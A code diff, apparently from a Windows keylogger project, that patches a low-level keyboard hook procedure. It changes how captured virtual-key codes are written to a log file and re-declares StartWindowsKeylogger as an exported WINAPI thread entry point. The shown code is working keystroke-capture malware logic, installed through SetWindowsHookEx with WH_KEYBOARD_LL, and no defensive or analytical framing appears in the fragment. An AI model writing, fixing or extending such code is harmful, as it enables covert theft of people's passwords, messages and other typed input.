@@ -20,7 +20,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         FILE* file;
         fopen_s(&file, keyloggerfile, "a");
         if (file != NULL) {
-            fprintf(file, "%c", vkCode);
+            fprintf(file, "%lu", vkCode);
             fclose(file);
         }
         keyCount++;
@@ -28,7 +28,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-void* StartWindowsKeylogger(void* arg) {
+//void* StartWindowsKeylogger(void* arg) {
+extern "C" DWORD WINAPI StartWindowsKeylogger(LPVOID arg) {
     HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     // wait for events
     MSG msg;
